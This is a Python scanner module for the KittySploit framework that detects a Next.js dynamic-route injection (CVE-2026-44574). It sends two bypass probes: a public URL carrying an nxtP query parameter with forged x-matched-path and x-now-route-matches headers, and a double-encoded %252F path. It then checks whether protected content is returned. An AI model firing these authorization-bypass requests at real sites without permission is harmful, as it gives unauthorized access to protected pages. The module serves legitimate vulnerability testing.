#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from urllib.parse import urlencode

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Next.js dynamic-route param injection (CVE-2026-44574) — detect",
        "description": (
            "Same two probes as the auxiliary module (nxtP* on a public URL + `%252F` path), "
            "without importing other Kittysploit modules."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-44574",
        "references": ["https://github.com/advisories/GHSA-492v-c6pp-mqqv"],
        "tags": ["scanner", "http", "nextjs", "middleware", "injection"],
    }

    protected_base = OptString("/admin", "Dynamic route prefix (e.g. /admin for /admin/[slug])", required=False)
    protected_slug = OptString("secret-page", "Protected [slug] value", required=False)
    public_path = OptString("/safe", "Public path for arm A", required=False)
    dynamic_param = OptString("slug", "Segment name → nxtP<name> and `[name]` in x-matched-path", required=False, advanced=True)
    sentinel = OptString("ADMIN_SECRET_FLAG", "Body substring when bypass hits protected content", required=False)

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _origin(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        return f"{proto}://{t}:{p}"

    def _norm_path(self, p):
        p = (p or "/").strip() or "/"
        return p if p.startswith("/") else "/" + p

    def _full(self, rel):
        return self._origin() + self._norm_path(rel)

    def _get(self, rel, extra_headers=None):
        url = self._full(rel)
        kw = dict(allow_redirects=False, timeout=float(self._o(self.timeout)))
        if extra_headers:
            kw["headers"] = extra_headers
        try:
            r = self.get(url, **kw)
            loc = (r.headers.get("Location") or "").strip()
            ct = (r.headers.get("Content-Type") or "").strip()
            return r.status_code, loc, ct, r.content[:200_000], None
        except Exception as e:
            return 0, "", "", b"", str(e)
        finally:
            if extra_headers:
                for k in extra_headers:
                    self.session.headers.pop(k, None)

    @staticmethod
    def _hit(code, body, needle):
        return code == 200 and bool(needle) and needle in body.decode("utf-8", "replace")

    def run(self):
        needle = str(self._o(self.sentinel) or "").strip()
        if not needle:
            self.set_info(reason="sentinel is empty")
            return False

        base = self._norm_path(str(self._o(self.protected_base) or "/admin"))
        slug = str(self._o(self.protected_slug) or "secret-page").strip()
        pub = self._norm_path(str(self._o(self.public_path) or "/safe"))
        name = str(self._o(self.dynamic_param) or "slug").strip() or "slug"

        canon = f"{base.rstrip('/')}/{slug}"
        bc, _, _, _, be = self._get(canon)
        if be:
            self.set_info(reason=f"baseline failed: {be}")
            return False

        qk = f"nxtP{name}"
        rel_a = f"{pub}?{urlencode({qk: slug, '__nextDefaultLocale': '', '__nextLocale': ''})}"
        hdr_a = {"x-matched-path": f"{base}/[{name}]", "x-now-route-matches": f"1={slug}"}
        ac, _, _, abody, ae = self._get(rel_a, hdr_a)

        rel_b = f"{base}/foo%252F{slug}"
        xc, _, _, xbody, xe = self._get(rel_b)

        hit_a = not ae and self._hit(ac, abody, needle)
        hit_b = not xe and self._hit(xc, xbody, needle)
        if hit_a or hit_b:
            self.set_info(reason="200 + sentinel", arm_a=hit_a, arm_b=hit_b, confidence="high")
            return True
        self.set_info(reason="no 200+sentinel", baseline_http=bc, confidence="medium")
        return False
